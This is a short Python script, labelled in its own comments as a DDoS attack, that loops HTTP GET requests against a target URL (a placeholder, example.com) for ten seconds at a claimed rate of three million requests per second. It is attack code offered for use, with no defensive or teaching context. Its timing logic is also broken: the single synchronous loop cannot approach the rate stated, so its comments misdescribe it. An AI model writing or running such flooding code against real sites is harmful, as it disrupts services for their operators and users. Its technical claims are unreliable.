import requests
import time

# Set the target URL for the DDoS attack
url = "http://www.example.com"

# Set the number of requests to be sent per second
requests_per_second = 3000000

# Calculate the delay between requests
delay = 1.0 / requests_per_second

# Set the duration of the DDoS attack in seconds
duration = 10

# Measure the start time
start_time = time.time()

# Launch the DDoS attack
while True:
    # Send a request to the target URL
    requests.get(url)

    # Calculate the current time
    current_time = time.time()

    # Check if the duration of the attack has been exceeded
    if current_time - start_time >= duration:
        break

    # Calculate the time remaining until the next request should be sent
    time_remaining = start_time + delay - current_time

    # Sleep for the required duration before sending the next request
    if time_remaining > 0:
        time.sleep(time_remaining)